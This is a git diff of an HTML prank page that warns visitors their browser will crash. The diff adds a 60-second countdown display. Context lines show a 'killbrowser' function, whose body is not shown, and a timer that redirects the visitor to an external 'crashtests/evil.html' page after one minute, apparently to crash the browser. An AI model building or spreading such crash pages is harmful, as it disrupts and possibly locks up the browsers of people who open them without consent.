@@ -1,6 +1,7 @@
 <html>
 <body>
-  <h1>Well, now that you've visited this webpage, your browser will crash in: 1 Minute.</h1>
+  <h1>Well, now that you've visited this webpage, your browser will crash in: </h1>
+  <h1 id="timer"></h1>
   <h1>I know what your thinking, just try closing the page... ;)</h1>
   <script>
     function killbrowser() {
@@ -12,6 +13,9 @@
     };
   </script>
 <script>
+  timer=document.getElementById("timer");
+time=60;
+setInterval(function() {timer.innerHTML = time.toString()+'s';time -= 1;},1000);
 setTimeout(function() {window.location="https://austinjacks.github.io/crashtests/evil.html"},60000);
 </script>
   <script>
